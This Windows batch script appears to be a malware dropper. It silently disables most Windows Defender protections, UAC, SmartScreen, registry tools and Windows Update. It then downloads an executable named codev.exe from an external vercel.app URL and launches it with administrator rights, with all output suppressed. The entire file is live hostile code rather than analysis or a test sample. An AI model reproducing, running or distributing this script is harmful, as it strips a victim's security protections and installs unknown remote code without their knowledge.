@echo off
setlocal enabledelayedexpansion

:: Disable Windows Defender and other security features
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" > nul 2>&1
powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" > nul 2>&1
powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" > nul 2>&1
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" > nul 2>&1
powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1

:: Disable UAC (User Account Control)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f > nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1

:: Disable Windows SmartScreen
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f > nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f > nul 2>&1

:: Disable Windows Update
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f > nul 2>&1

:: Download the program
set "outputFile=%TEMP%\codev.exe"
set "downloadUrl=https://codev-zeta.vercel.app/codev.exe"

echo Downloading the program...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%downloadUrl%', '%outputFile%')" > nul 2>&1

if not exist "%outputFile%" (
    echo Failed to download the program.
    exit /b 1
)

echo Program downloaded successfully.

:: Run the downloaded program with admin privileges
echo Running the program...
powershell -Command "Start-Process '%outputFile%' -Verb RunAs" > nul 2>&1
ping -n 5 127.0.0.1 > nul 2>&1

:: Check if the program is running
tasklist /fi "imagename eq codev.exe" | find /i "codev.exe" > nul 2>&1
if errorlevel 1 (
    echo The program is not running.
    exit /b 1
)

echo Program is running successfully.

endlocal
exit /b
